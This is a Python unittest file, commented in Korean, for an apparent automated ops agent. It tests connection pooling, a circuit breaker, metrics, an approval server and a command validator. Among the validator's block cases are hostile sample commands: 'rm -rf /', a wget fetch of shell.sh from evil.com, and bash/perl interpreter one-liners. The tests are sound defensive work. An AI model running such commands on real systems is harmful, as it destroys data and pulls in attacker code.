"""
최종 종합 테스트 — 구현된 개선 사항 전체 검증
#1 데몬모드 블로킹 제거, #2 ChromaDB 싱글톤, #3 resolution_source 직접 사용,
#4 command 분리, #5 Slack 중복 제거, #6 Ollama 재시도, #7 SQLite 풀,
#8 threshold 스윕, #10 HALF_OPEN 경합 제거, #11 DI,
#13 error_category, #16 승인 서버
"""
import os
import sys
import tempfile
import threading
import time
import unittest
import sqlite3

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))


# ─────────────────────────────────────────────────────────────
# #7 SQLite 연결 풀
# ─────────────────────────────────────────────────────────────
class TestSQLitePool(unittest.TestCase):
    def setUp(self):
        self.tf = tempfile.mktemp(suffix=".db")

    def tearDown(self):
        try:
            os.unlink(self.tf)
        except OSError:
            pass

    def test_same_thread_same_connection(self):
        from src.utils.sqlite_pool import get_conn
        c1 = get_conn(self.tf)
        c2 = get_conn(self.tf)
        self.assertIs(c1, c2, "같은 스레드에서 동일 연결 객체를 반환해야 한다")

    def test_wal_mode(self):
        from src.utils.sqlite_pool import get_conn
        conn = get_conn(self.tf)
        mode = conn.execute("PRAGMA journal_mode").fetchone()[0]
        self.assertEqual(mode, "wal", "WAL 모드가 활성화돼야 한다")

    def test_different_threads_different_connections(self):
        from src.utils.sqlite_pool import get_conn
        results = {}
        def worker(name):
            results[name] = id(get_conn(self.tf))
        t1 = threading.Thread(target=worker, args=("t1",))
        t2 = threading.Thread(target=worker, args=("t2",))
        t1.start(); t2.start()
        t1.join(); t2.join()
        self.assertNotEqual(results["t1"], results["t2"],
                            "다른 스레드는 다른 연결을 가져야 한다")


# ─────────────────────────────────────────────────────────────
# #10 Circuit Breaker HALF_OPEN 원자적 처리
# ─────────────────────────────────────────────────────────────
class TestCircuitBreaker(unittest.TestCase):
    def setUp(self):
        self.tf = tempfile.mktemp(suffix=".db")
        os.makedirs(os.path.dirname(os.path.abspath(self.tf)), exist_ok=True)
        from src.circuit_breaker import CircuitBreaker
        self.cb = CircuitBreaker(db_path=self.tf)
        self.err = "ERROR: Test error for circuit breaker"

    def tearDown(self):
        try:
            os.unlink(self.tf)
        except OSError:
            pass

    def test_closed_allows_proceed(self):
        self.assertTrue(self.cb.can_proceed(self.err))

    def test_open_after_threshold_failures(self):
        from src.circuit_breaker import FAILURE_THRESHOLD
        for _ in range(FAILURE_THRESHOLD):
            self.cb.record_result(self.err, success=False)
        self.assertFalse(self.cb.can_proceed(self.err))

    def test_success_resets_to_closed(self):
        self.cb.record_result(self.err, success=False)
        self.cb.record_result(self.err, success=True)
        self.assertTrue(self.cb.can_proceed(self.err))

    def test_half_open_only_one_test_request(self):
        """여러 스레드가 동시에 HALF_OPEN 진입 시 단 1개만 허용"""
        from src.circuit_breaker import FAILURE_THRESHOLD, STATE_OPEN, STATE_HALF_OPEN
        sig = self.cb._sig(self.err)
        # 강제로 HALF_OPEN 상태 + test_in_progress=0 세팅
        past = "2000-01-01T00:00:00+00:00"
        self.cb._write(sig, STATE_HALF_OPEN, FAILURE_THRESHOLD, past, test_in_progress=0)

        results = []
        def try_proceed():
            results.append(self.cb._try_claim_half_open(sig, elapsed=None))

        threads = [threading.Thread(target=try_proceed) for _ in range(10)]
        for t in threads: t.start()
        for t in threads: t.join()

        self.assertEqual(results.count(True), 1,
                         "HALF_OPEN에서 정확히 1개 스레드만 허용돼야 한다")

    def test_get_status_fields(self):
        status = self.cb.get_status(self.err)
        self.assertIn("state",            status)
        self.assertIn("failures",         status)
        self.assertIn("test_in_progress", status)


# ─────────────────────────────────────────────────────────────
# #7+#13 Observability — sqlite_pool + error_category
# ─────────────────────────────────────────────────────────────
class TestObservability(unittest.TestCase):
    def setUp(self):
        self.tf = tempfile.mktemp(suffix=".db")
        from src.observability import AgentObserver
        self.obs = AgentObserver(db_path=self.tf)

    def tearDown(self):
        try:
            os.unlink(self.tf)
        except OSError:
            pass

    def test_log_event_with_error_category(self):
        self.obs.log_event(
            error_log="ERROR: OOM test",
            source="L1_CACHE",
            action_type="CLEAR_MEMORY",
            latency_sec=0.05,
            success=True,
            result_category="SUCCESS",
            error_category="Out_Of_Memory",
        )
        conn = sqlite3.connect(self.tf)
        row = conn.execute("SELECT error_category FROM metrics ORDER BY id DESC LIMIT 1").fetchone()
        conn.close()
        self.assertEqual(row[0], "Out_Of_Memory")

    def test_error_category_column_exists(self):
        conn = sqlite3.connect(self.tf)
        cols = {r[1] for r in conn.execute("PRAGMA table_info(metrics)")}
        conn.close()
        self.assertIn("error_category", cols)

    def test_null_error_category_allowed(self):
        """error_category 없이도 기록 가능 (하위 호환)"""
        self.obs.log_event(
            error_log="CRITICAL: disk full",
            source="RULE",
            action_type="ESCALATE_TO_HUMAN",
            latency_sec=0.01,
            success=False,
        )
        conn = sqlite3.connect(self.tf)
        cnt = conn.execute("SELECT COUNT(*) FROM metrics").fetchone()[0]
        conn.close()
        self.assertGreater(cnt, 0)


# ─────────────────────────────────────────────────────────────
# #11 LogTailHandler DI
# ─────────────────────────────────────────────────────────────
class TestLogTailHandlerDI(unittest.TestCase):
    def test_custom_injected_objects(self):
        from unittest.mock import MagicMock
        from src.utils.debouncer import LogDebouncer
        from src.log_watcher import LogTailHandler

        tf = tempfile.mktemp(suffix=".log")
        open(tf, "w").write("test\n")
        debouncer = LogDebouncer(30)

        mock_executor = MagicMock()
        mock_observer = MagicMock()
        mock_engine   = MagicMock()
        mock_cb       = MagicMock()

        handler = LogTailHandler(
            tf, debouncer,
            executor=mock_executor,
            observer_agent=mock_observer,
            engine=mock_engine,
            circuit_breaker=mock_cb,
        )
        self.assertIs(handler.executor, mock_executor)
        self.assertIs(handler.observer_agent, mock_observer)
        self.assertIs(handler.engine, mock_engine)
        self.assertIs(handler.circuit_breaker, mock_cb)
        os.unlink(tf)

    def test_default_objects_when_no_injection(self):
        from src.utils.debouncer import LogDebouncer
        from src.log_watcher import LogTailHandler
        from src.executor import ActionExecutor
        from src.observability import AgentObserver

        tf = tempfile.mktemp(suffix=".log")
        open(tf, "w").write("test\n")
        debouncer = LogDebouncer(30)
        handler = LogTailHandler(tf, debouncer)

        self.assertIsInstance(handler.executor, ActionExecutor)
        self.assertIsInstance(handler.observer_agent, AgentObserver)
        os.unlink(tf)


# ─────────────────────────────────────────────────────────────
# #1+#4 executor — command validation + isatty branch
# ─────────────────────────────────────────────────────────────
class TestExecutorSecurity(unittest.TestCase):
    def setUp(self):
        from src.executor import ActionExecutor
        self.ex = ActionExecutor()

    def test_whitelist_pass(self):
        tokens, err = self.ex._validate_command("systemctl restart nginx")
        self.assertIsNone(err)
        self.assertEqual(tokens[0], "systemctl")

    def test_blacklist_block(self):
        _, err = self.ex._validate_command("rm -rf /")
        self.assertIsNotNone(err)
        self.assertEqual(err["error_type"], "SecurityBlock")

    def test_shell_metachar_block(self):
        _, err = self.ex._validate_command("echo foo | cat")
        self.assertIsNotNone(err)
        self.assertIn("메타문자", err["error_detail"])

    def test_unknown_command_block(self):
        _, err = self.ex._validate_command("wget http://evil.com/shell.sh")
        self.assertIsNotNone(err)

    def test_interpreter_block(self):
        for cmd in ["python3 -c 'import os'", "bash -c id", "perl -e 'system(id)'"]:
            _, err = self.ex._validate_command(cmd)
            self.assertIsNotNone(err, f"인터프리터 '{cmd}' 차단 실패")

    def test_empty_command(self):
        _, err = self.ex._validate_command("")
        self.assertIsNotNone(err)


# ─────────────────────────────────────────────────────────────
# #16 Approval Store
# ─────────────────────────────────────────────────────────────
class TestApprovalStore(unittest.TestCase):
    def setUp(self):
        import src.approval_store as store
        self.store = store
        self.orig_db = store._DB_PATH
        self.tf = tempfile.mktemp(suffix=".db")
        store._DB_PATH = self.tf
        store.init_table()

    def tearDown(self):
        self.store._DB_PATH = self.orig_db
        try:
            os.unlink(self.tf)
        except OSError:
            pass

    def test_create_and_get_pending(self):
        token = self.store.create_request("systemctl restart nginx", "ERROR", "test")
        self.assertEqual(self.store.get_status(token), "pending")

    def test_approve(self):
        token = self.store.create_request("free -m", "ERROR", "test")
        ok = self.store.set_decision(token, "approved")
        self.assertTrue(ok)
        self.assertEqual(self.store.get_status(token), "approved")

    def test_reject(self):
        token = self.store.create_request("df -h", "ERROR", "test")
        ok = self.store.set_decision(token, "rejected")
        self.assertTrue(ok)
        self.assertEqual(self.store.get_status(token), "rejected")

    def test_double_decide_fails(self):
        """이미 결정된 요청은 다시 변경 불가"""
        token = self.store.create_request("uptime", "ERROR", "test")
        self.store.set_decision(token, "approved")
        ok = self.store.set_decision(token, "rejected")
        self.assertFalse(ok)
        self.assertEqual(self.store.get_status(token), "approved")

    def test_unknown_token_returns_none(self):
        self.assertIsNone(self.store.get_status("nonexistent_token_xyz"))


# ─────────────────────────────────────────────────────────────
# #16 Approval Server endpoints
# ─────────────────────────────────────────────────────────────
class TestApprovalServer(unittest.TestCase):
    def setUp(self):
        from fastapi.testclient import TestClient
        import src.approval_store as store
        self.store = store
        self.orig_db = store._DB_PATH
        self.tf = tempfile.mktemp(suffix=".db")
        store._DB_PATH = self.tf
        store.init_table()
        from src.approval_server import app
        self.client = TestClient(app)

    def tearDown(self):
        self.store._DB_PATH = self.orig_db
        try:
            os.unlink(self.tf)
        except OSError:
            pass

    def test_approve_endpoint(self):
        token = self.store.create_request("systemctl status nginx", "ERROR", "test")
        resp  = self.client.get(f"/approve/{token}")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(self.store.get_status(token), "approved")

    def test_reject_endpoint(self):
        token = self.store.create_request("uptime", "ERROR", "test")
        resp  = self.client.get(f"/reject/{token}")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(self.store.get_status(token), "rejected")

    def test_already_decided_returns_409(self):
        token = self.store.create_request("free", "ERROR", "test")
        self.client.get(f"/approve/{token}")
        resp = self.client.get(f"/approve/{token}")
        self.assertEqual(resp.status_code, 409)

    def test_unknown_token_returns_404(self):
        resp = self.client.get("/approve/invalid_token_xyz")
        self.assertEqual(resp.status_code, 404)

    def test_health_endpoint(self):
        resp = self.client.get("/health")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.json()["status"], "ok")


# ─────────────────────────────────────────────────────────────
# #3+#8 schemas — AgentResponse 필드 검증
# ─────────────────────────────────────────────────────────────
class TestSchemas(unittest.TestCase):
    def test_agent_response_has_resolution_source(self):
        from src.schemas import AgentResponse, ActionType
        r = AgentResponse(
            error_category="OOM",
            severity="HIGH",
            action_type=ActionType.CLEAR_MEMORY,
        )
        self.assertEqual(r.resolution_source, "L1_CACHE")
        self.assertIsNone(r.command)

    def test_agent_response_with_command(self):
        from src.schemas import AgentResponse, ActionType
        r = AgentResponse(
            error_category="DB_Connection",
            severity="MEDIUM",
            action_type=ActionType.EXECUTE_LLM_COMMAND,
            command="systemctl restart postgresql",
            resolution_source="L2_LLM",
        )
        self.assertEqual(r.command, "systemctl restart postgresql")
        self.assertEqual(r.resolution_source, "L2_LLM")


# ─────────────────────────────────────────────────────────────
# #8 Threshold 스윕 결과 반영 확인
# ─────────────────────────────────────────────────────────────
class TestThresholdApplied(unittest.TestCase):
    def test_threshold_value_reasonable(self):
        """threshold가 0.1~1.5 범위 내 합리적인 값인지 확인"""
        import re
        with open("src/llm_engine.py", encoding="utf-8") as f:
            content = f.read()
        m = re.search(r"if distance\s*[><=]+\s*(\d+\.\d+)", content)
        self.assertIsNotNone(m, "threshold 비교 구문을 찾지 못했다")
        threshold = float(m.group(1))
        self.assertGreater(threshold, 0.0)
        self.assertLess(threshold, 2.0, f"threshold={threshold}이 비합리적으로 크다")


if __name__ == "__main__":
    unittest.main(verbosity=2)
